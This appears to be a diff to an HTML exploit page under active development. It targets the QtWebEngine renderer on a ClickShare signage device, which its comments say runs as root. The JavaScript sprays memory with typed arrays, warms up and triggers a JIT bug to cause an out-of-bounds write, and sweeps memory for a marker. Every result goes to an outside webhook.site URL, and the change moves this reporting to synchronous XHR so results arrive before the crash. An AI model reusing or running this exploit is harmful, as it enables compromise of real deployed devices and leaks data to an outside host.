@@ -1,22 +1,24 @@
 <html><body><script>
-// ClickShare signage -- stage 1: PROVEN PoC (dev7965_live.html, fired LIVE-fire on QtWebEngine/6.7.2 @21:24:48)
-// + OBSERVABLE OOB write (MARKER) + victim spray + sweep after EVERY trigger.
-// Renderer runs in ROOT context on the device; JS here is root code already.
+// ClickShare signage -- stage 1 v4. KEY FIX: beacons via SYNCHRONOUS XHR, so every result is
+// delivered BEFORE the (expected) renderer crash. Proven PoC kept byte-for-byte.
+// Evidence base: device log shows "MainScreenItemRenderer::onWebView" + "crash detected" every ~180ms
+// => webengine DOES start; it dies on our PoC before async beacons can flush.
 const SINK = 'https://webhook.site/9b9f3ae6-9ca5-4a70-8d42-d9a45b78db92';
-const MARKER = 1.2345678901234e-300;   // subnormal -> survives f64 round-trip, unmistakable
+const MARKER = 1.2345678901234e-300;
 function beacon(t, v){
-  try { new Image().src = SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)); } catch(e) {}
-  try { fetch(SINK + '?t2=' + encodeURIComponent(t), {mode:'no-cors'}); } catch(e) {}
+  try {                                   // SYNC: returns only after the request is on the wire
+    var x = new XMLHttpRequest();
+    x.open('GET', SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)), false);
+    x.send();
+  } catch(e) {}
 }
-beacon('V2-live-start', navigator.userAgent.slice(0,80));
+beacon('V4-start', navigator.userAgent.slice(0,80));
 try {
-  // ---- victims: 4000 Float64Arrays; whichever lands right after the corrupted oob_array gets MARKER ----
-  const VICT = 4000, VLEN = 64;
+  const VICT = 800, VLEN = 64;
   var spray = new Array(VICT);
   for (let i = 0; i < VICT; i++) { spray[i] = new Float64Array(VLEN); spray[i][0] = 1.1; }
-  beacon('V2-spray-done', VICT);
+  beacon('V4-spray-done', VICT);
 
-  // ---- grooming array exactly as the proven PoC ----
   var fake = new Uint32Array(10);
   for (var i=0;i<9;i++) fake[i] = i+1;
   fake[0]=1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
@@ -43,30 +45,30 @@ try {
     }
     return [index, BigInt(just_a_variable)];
   }
-  for (let i = 2; i < 0x500; i++) poc(i);
-  poc(7*5); beacon('V2-warm-done','ok');
-  for (let i = 0; i < 50000; i++) poc(i % 500 + 2);
-  beacon('V2-warm50k-done','ok');
-
-  // ---- sweep the spray for the marker (and for length anomalies) ----
   var hits = 0;
   function sweep(tag){
     for (let k = 0; k < VICT; k++) {
       var a = spray[k];
-      if (a.length !== VLEN) { if (hits < 8) beacon('HIT-len', 'at='+tag+' k='+k+' len='+a.length); hits++; continue; }
-      for (let j = 0; j < VLEN; j++) { if (a[j] === MARKER) { if (hits < 8) beacon('HIT-mark', 'at='+tag+' k='+k+' j='+j); hits++; break; } }
+      if (a.length !== VLEN) { if (hits < 10) beacon('HIT-len', 'at='+tag+' k='+k+' len='+a.length); hits++; continue; }
+      for (let j = 0; j < VLEN; j++) { if (a[j] === MARKER) { if (hits < 10) beacon('HIT-mark', 'at='+tag+' k='+k+' j='+j); hits++; break; } }
     }
-    beacon('V2-iter', 'at='+tag+' hits='+hits);
-    return hits;
+    beacon('V4-iter', 'at='+tag+' hits='+hits);
   }
-  sweep('pre');
-  var triggers = [35, 70, 105, 140, 175, 385, 665];
+  // phase 1: warm-up (this is where the OOB write can already land) -> sweep while still alive
+  for (let i = 2; i < 0x500; i++) poc(i);
+  beacon('V4-warm-done','ok');
+  sweep('warm');
+  for (let i = 0; i < 20000; i++) poc(i % 500 + 2);
+  beacon('V4-warm20k-done','ok');
+  sweep('warm20k');
+  // phase 2: the fatal triggers, sweep between each (sync beacons guarantee the result survives)
+  let triggers = [35, 70, 105];
   for (let t = 0; t < triggers.length; t++) {
-    beacon('V2-fire', 'a=' + triggers[t]);
+    beacon('V4-fire', 'a=' + triggers[t]);
     poc(triggers[t]);
-    sweep('a' + triggers[t]);      // count the hit BEFORE any later crash
+    sweep('a' + triggers[t]);
   }
-  beacon('V2-SURVIVED', 'hits=' + hits);
-} catch (e) { beacon('V2-exc', String(e).slice(0,120)); }
-beacon('V2-done','end-of-page');
+  beacon('V4-SURVIVED', 'hits=' + hits);
+} catch (e) { beacon('V4-exc', String(e).slice(0,120)); }
+beacon('V4-done','end-of-page');
 </script></body></html>
